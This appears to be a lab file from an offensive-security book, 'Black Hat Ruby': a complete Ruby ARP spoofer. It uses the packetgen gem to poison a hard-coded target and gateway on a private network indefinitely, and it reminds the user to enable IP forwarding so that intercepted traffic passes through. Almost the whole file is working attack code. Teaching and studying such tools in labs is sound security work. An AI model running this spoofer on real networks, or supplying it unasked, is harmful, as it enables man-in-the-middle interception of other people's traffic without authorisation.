#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri | @KINGSABRI
# Description:
#   ARP Spoofer
# Requirements:
#   apt install libpcap-dev
#   gem install packetgen
# 
require 'packetgen'
require 'packetgen/utils'

gateway  = "192.168.100.1"
target   = "192.168.100.17"
opts = {
  mac:         "00:11:22:33:44:55",
  iface:       'wls1',
  interval:    2,
  for_seconds: nil # forever
}

puts "[*] Don't forget to enable IP forwarding: sysctl -w net.ipv4.ip_forward=1"
puts "[+] Starting ARP spoofing..."
PacketGen::Utils.arp_spoof(target, gateway, opts)